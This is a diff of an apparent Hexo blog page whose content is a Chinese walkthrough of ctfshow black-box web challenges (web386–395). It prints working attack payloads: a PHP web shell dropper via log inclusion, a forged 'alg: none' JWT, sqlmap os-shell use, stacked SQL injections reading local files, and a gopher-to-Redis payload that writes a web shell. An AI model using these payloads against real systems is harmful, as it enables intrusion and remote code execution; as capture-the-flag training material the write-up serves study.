@@ -83,7 +83,9 @@
     
 	<!-- mathjax -->
 	
-<meta name="generator" content="Hexo 5.4.2"></head>
+<!-- hexo injector head_end start -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/katex@0.12.0/dist/katex.min.css">
+<!-- hexo injector head_end end --><meta name="generator" content="Hexo 5.4.2"></head>
 
 <body class="max-width mx-auto px3 ltr">
     
@@ -223,7 +225,7 @@
 </ol>
 <p>访问<code>clear.php/?file=./install/lock.dat</code>即可清理掉lock.dat</p>
 <p>之后再去访问<code>/install?install</code>即可重置密码，然后重新弱密码登录即可</p>
-<ol start="8">
+<ol>
 <li><p>web386. 前面部分和386一样</p>
 <p>这题已经没法去删掉lock.dat文件了，再扫扫目录</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116105922442.png" alt="image-20221116105922442"></p>
@@ -235,10 +237,9 @@
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116110528137.png" alt="image-20221116110528137"></p>
 <p>直接写马失败，按照上题思路，我们可以手动删除lock.dat文件，尝试写入</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> <span class="title function_ invoke__">unlink</span>(<span class="string">&#x27;/var/www/html/install/lock.dat&#x27;</span>); <span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116111140139.png" alt="image-20221116111140139"></p>
 <p>之后按照上题来就行</p>
-<ol start="9">
+<ol>
 <li><p>web387</p>
 <p>按照上一题的思路来，会发现已经无回显</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116111348215.png" alt="image-20221116111348215"></p>
@@ -253,32 +254,27 @@
 <p>也就是说，我们这里可以上传txt,html一类文件，且上传后的文件路径可知<code>/alsckdfy/attached/file/</code> . 这里的话我们可以配合之前的日志包含，将一段php恶意代码通过日志文件来执行</p>
 <p>首先，上传恶意代码</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">	<span class="variable">$a</span> = <span class="string">&#x27;&lt;?ph&#x27;</span>.<span class="string">&#x27;p ev&#x27;</span>.<span class="string">&#x27;al($_PO&#x27;</span>.<span class="string">&#x27;ST[1]);?&gt;&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">file_put_contents</span>(<span class="string">&#x27;/var/www/html/1.php&#x27;</span>, <span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
 <p>访问该文件验证上传成功</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116115743377.png" alt="image-20221116115743377"></p>
 <p>接下来访问<code>/debug?file=xxx</code>，来将恶意代码写入日志文件</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/www/html/alsckdfy/attached/file/20221116/20221116035705_82067.txt</span><br></pre></td></tr></table></figure>
-
 <p>然后包含日志文件进来，使得恶意代码被解析执行</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/debug/?file=/var/log/nginx/access.log</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116203650041.png" alt="image-20221116203650041"></p>
-<ol start="10">
+<ol>
 <li><p>web389</p>
 <p>直接访问<code>/debug</code>，会回显权限不足</p>
 <p>看看cookie，存在auth键值对</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auth=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJhZG1pbiIsImlhdCI6MTY2ODYwNzU4NywiZXhwIjoxNjY4NjE0Nzg3LCJuYmYiOjE2Njg2MDc1ODcsInN1YiI6InVzZXIiLCJqdGkiOiI3MTI0N2E3ZDMxOWE1MmMzZjM3YmE3OTA5MGM1N2FkZCJ9.jxCUL0trBNZNdp_fXROsID50HaOnAs37mEbBWuUhnJk</span><br></pre></td></tr></table></figure>
-
 <p>很明显是一个jwt鉴权，我们解码一下看看字段</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116221204844.png" alt="image-20221116221204844"></p>
 <p>尝试直接进行空加密</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> jwt</span><br><span class="line"></span><br><span class="line">payload = &#123;</span><br><span class="line">    <span class="string">&quot;iss&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;iat&quot;</span>: <span class="number">1668607587</span>,</span><br><span class="line">    <span class="string">&quot;exp&quot;</span>: <span class="number">1668614787</span>,</span><br><span class="line">    <span class="string">&quot;nbf&quot;</span>: <span class="number">1668607587</span>,</span><br><span class="line">    <span class="string">&quot;sub&quot;</span>: <span class="string">&quot;admin&quot;</span>,</span><br><span class="line">    <span class="string">&quot;jti&quot;</span>: <span class="string">&quot;71247a7d319a52c3f37ba79090c57add&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">header = &#123;</span><br><span class="line">    <span class="string">&quot;alg&quot;</span>: <span class="string">&quot;none&quot;</span>,</span><br><span class="line">    <span class="string">&quot;typ&quot;</span>: <span class="string">&quot;JWT&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">token = jwt.encode(payload, key=<span class="string">&quot;&quot;</span>, algorithm=<span class="string">&quot;none&quot;</span>, headers=header)</span><br><span class="line"><span class="built_in">print</span>(token)</span><br></pre></td></tr></table></figure>
-
 <p>接下来按照上一题流程即可</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223211323.png" alt="image-20221116223211323"></p>
 </li>
 </ol>
-<ol start="11">
+<ol>
 <li><p>web390</p>
 <p>关注url出现了参数</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223401984.png" alt="image-20221116223401984"></p>
@@ -288,7 +284,6 @@
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116223630665.png" alt="image-20221116223630665"></p>
 <p>由此可知存在盲注，直接sqlmap一把梭</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u xxx --os-shell</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116224655638.png" alt="image-20221116224655638"></p>
 </li>
 <li><p>web391-392</p>
@@ -297,7 +292,7 @@
 </li>
 </ol>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221116225348427.png" alt="image-20221116225348427"></p>
-<ol start="13">
+<ol>
 <li><p>web393</p>
 <p>title处的参数仍然存在时间回显不一致的问题（比较隐蔽），可以利用盲注。同时关注到底下多了一个搜索引擎</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117220504436.png" alt="image-20221117220504436"></p>
@@ -307,20 +302,16 @@
 </ol>
 <p>这里讲述另外一种利用方式，先基本查一下库中数据</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; --dbs</span><br><span class="line"># ctfshow</span><br><span class="line"> sqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; -D ctfshow --tables</span><br><span class="line"># admin_user content link</span><br><span class="line">sqlmap -u &quot;http://836b34a4-5a85-46c1-ae8a-c68874d0c7e8.challenge.ctf.show/search.php?title=1&quot; -D ctfshow -T link --columns</span><br><span class="line"># id name url(varchar)</span><br></pre></td></tr></table></figure>
-
 <p>因此结合回显，我们可以修改id对应的url值，利用file协议将本地文件回显出来</p>
-<p>**payload: **</p>
+<p><strong>payload: </strong></p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; update link set url=&#x27;file:///flag&#x27; where id=4; %23</span><br></pre></td></tr></table></figure>
-
-<ol start="14">
+<ol>
 <li><p>web394 FLAG_NOT_HERE</p>
 <p>title字段仍然存在时间回显问题，所以可以继续时间盲注。我们依然可以用上一题的思路通过修改Url的值来回显flag，需要注意的是，这次参数存在关键词过滤，因此需要通过编码绕过</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; update link set url=0x66696c653a2f2f2f666c6167; %23</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117223645751.png" alt="image-20221117223645751"></p>
 <p>发现flag不在根目录了，那就还在<code>/var/www/html/alsckdfy/check.php</code>中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; update link set url=0x66696c653a2f2f2f7661722f7777772f68746d6c2f616c73636b6466792f636865636b2e706870; %23</span><br></pre></td></tr></table></figure>
-
 <p>原来在源代码里，差点被骗了。。。</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117223941184.png" alt="image-20221117223941184"></p>
 </li>
@@ -330,16 +321,13 @@
 <p>我们首先要解决的问题是url字段长度问题，由前面几题知道该字段结构为<code>varchar(255)</code>,</p>
 <p>因此先修改字段类型为text</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; alter table link modify column url text; %23</span><br></pre></td></tr></table></figure>
-
 <p>接着生成gopher的payload</p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117225310123.png" alt="image-20221117225310123"></p>
 </li>
 </ol>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://127.0.0.1:6379/_%2A1%0D%0A%248%0D%0Aflushall%0D%0A%2A3%0D%0A%243%0D%0Aset%0D%0A%241%0D%0A1%0D%0A%2430%0D%0A%0A%0A%3C%3Fphp%20%40eval%28%24_POST%5B1%5D%29%3B%20%3F%3E%0A%0A%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%243%0D%0Adir%0D%0A%2413%0D%0A/var/www/html%0D%0A%2A4%0D%0A%246%0D%0Aconfig%0D%0A%243%0D%0Aset%0D%0A%2410%0D%0Adbfilename%0D%0A%249%0D%0Ashell.php%0D%0A%2A1%0D%0A%244%0D%0Asave%0D%0A%0A</span><br></pre></td></tr></table></figure>
-
 <p>然后将其插入到link表的insert字段当中</p>
 <figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x27;; insert into link values(10,&quot;a&quot;, 0x676f706865723a2f2f3132372e302e302e313a363337392f5f2532413125304425304125323438253044253041666c757368616c6c2530442530412532413325304425304125323433253044253041736574253044253041253234312530442530413125304425304125323433302530442530412530412530412533432533467068702532302534306576616c2532382532345f504f5354253542312535442532392533422532302533462533452530412530412530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343325304425304164697225304425304125323431332530442530412f7661722f7777772f68746d6c2530442530412532413425304425304125323436253044253041636f6e666967253044253041253234332530442530417365742530442530412532343130253044253041646266696c656e616d65253044253041253234392530442530417368656c6c2e706870253044253041253241312530442530412532343425304425304173617665253044253041253041); %23</span><br></pre></td></tr></table></figure>
-
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117230226894.png" alt="image-20221117230226894"></p>
 <p><img src="/2022/11/17/ctfshow-%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/image-20221117230321734.png" alt="image-20221117230321734"></p>
 
